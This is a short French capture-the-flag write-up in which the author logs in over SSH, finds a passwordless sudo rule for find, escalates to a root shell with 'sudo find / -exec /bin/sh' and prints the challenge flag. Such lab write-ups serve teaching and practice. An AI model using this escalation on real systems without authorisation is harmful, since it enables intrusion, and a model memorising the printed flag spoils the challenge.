# Ce(-l)l Block

## SSH
Pour la connexion SSH nous avons les identifiants, donc pas besoin d'étape intermediaire : 
``` Bash
ssh user@0.0.0.0 -p 5023
```

## PrivEsc
Après s'être connecté en SSH, nous pouvons commencer l'énumération des droits sudo : 
``` Bash
user@956627b54082:~$ sudo -l

User user may run the following commands on 956627b54082:
    (root) NOPASSWD: /usr/bin/find
```
Nous pouvons voir que nous avons les droits root sur le binaire find et qu'il nécessite pas de mot de passe root. 

``` Bash
user@956627b54082:~$ sudo find / -exec /bin/sh \;
# id
uid=0(root) gid=0(root) groups=0(root)
```
Explication de la commande : 
 - ``sudo find /`` : Lance find en tant que root.
 - ``-exec /bin/sh \;`` : Exécute /bin/sh

``` Bash
cat /root/flag.txt
SKL{5ud0_1n53cur1ty_4ll0w5_f1nd_3xpl01t}
```
